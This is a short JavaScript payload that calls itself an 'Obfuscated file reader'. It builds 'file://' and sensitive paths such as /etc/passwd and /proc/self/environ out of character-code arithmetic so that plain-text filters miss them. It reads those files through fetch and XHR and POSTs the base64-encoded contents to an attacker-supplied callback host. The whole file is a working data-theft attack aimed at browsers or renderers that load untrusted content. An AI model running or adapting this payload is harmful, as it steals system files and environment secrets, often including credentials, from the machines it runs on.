// Obfuscated file reader — all paths built from arithmetic at runtime
(function(){
  var o = document.getElementById('out') || document.body;
  var L = window._L || [];

  // Build URL components from arithmetic
  // 'f'=102, 'i'=105, 'l'=108, 'e'=101, ':'=58, '/'=47
  var _ = function(n) { return String.fromCharCode(n + 55); };
  var proto = _(47) + _(50) + _(53) + _(46) + _(3) + _(-8) + _(-8);

  // Path components from math
  var s = function(n) { return String.fromCharCode(n + 33); };
  // '/etc/hostname' = [47,101,116,99,47,104,111,115,116,110,97,109,101]
  var hn = s(14)+s(68)+s(83)+s(66)+s(14)+s(71)+s(78)+s(82)+s(83)+s(77)+s(64)+s(76)+s(68);
  // '/etc/passwd' = [47,101,116,99,47,112,97,115,115,119,100]
  var pw = s(14)+s(68)+s(83)+s(66)+s(14)+s(79)+s(64)+s(82)+s(82)+s(86)+s(67);
  // '/proc/version' = [47,112,114,111,99,47,118,101,114,115,105,111,110]
  var pv = s(14)+s(79)+s(81)+s(78)+s(66)+s(14)+s(85)+s(68)+s(81)+s(82)+s(72)+s(78)+s(77);
  // '/proc/self/cmdline'
  var pc = s(14)+s(79)+s(81)+s(78)+s(66)+s(14)+s(82)+s(68)+s(75)+s(69)+s(14)+s(66)+s(76)+s(67)+s(75)+s(72)+s(77)+s(68);
  // '/proc/self/environ'
  var pe = s(14)+s(79)+s(81)+s(78)+s(66)+s(14)+s(82)+s(68)+s(75)+s(69)+s(14)+s(68)+s(77)+s(85)+s(72)+s(81)+s(78)+s(77);

  var targets = [hn, pw, pv, pc, pe];

  function log(m) {
    L.push(m);
    if (o.textContent !== undefined) o.textContent = L.join('\n');
  }

  log('Reader loaded. proto=' + proto);
  log('paths: ' + targets.map(function(t){return t.substring(0,12)}).join(', '));

  var CB = window._CB || '';
  var done = 0;

  targets.forEach(function(path, i) {
    var url = proto + path;
    setTimeout(function() {
      // fetch
      fetch(url).then(function(r) {
        log('F[' + path.substring(0,12) + '] s=' + r.status + ' t=' + r.type + ' ok=' + r.ok);
        return r.text();
      }).then(function(text) {
        log('DATA[' + path.substring(0,12) + ']: ' + text.substring(0, 300));
        if (CB) {
          try {
            fetch(CB + '/fr', {
              method: 'POST', mode: 'no-cors',
              body: JSON.stringify({p: path, d: btoa(text.substring(0, 3000))}),
              headers: {'Content-Type': 'text/plain'}
            });
          } catch(x){}
        }
      }).catch(function(e) {
        log('E[' + path.substring(0,12) + ']: ' + e.name + ': ' + e.message.substring(0, 60));
      }).finally(function() {
        done++;
        if (done >= targets.length) {
          log('\nALL DONE: ' + done);
          if (CB) fetch(CB+'/fs',{method:'POST',mode:'no-cors',body:'r='+encodeURIComponent(btoa(L.join('\n'))),headers:{'Content-Type':'application/x-www-form-urlencoded'}});
        }
      });

      // XHR
      if (i < 2) {
        try {
          var xhr = new XMLHttpRequest();
          xhr.open('GET', url, true);
          xhr.onload = function() {
            log('X[' + path.substring(0,12) + '] s=' + xhr.status + ' len=' + xhr.responseText.length);
            if (xhr.responseText.length > 0) log('XD: ' + xhr.responseText.substring(0, 200));
          };
          xhr.onerror = function() { log('X[' + path.substring(0,12) + '] net err'); };
          xhr.send();
        } catch(x) { log('X EX: ' + x.message); }
      }
    }, i * 150);
  });
})();
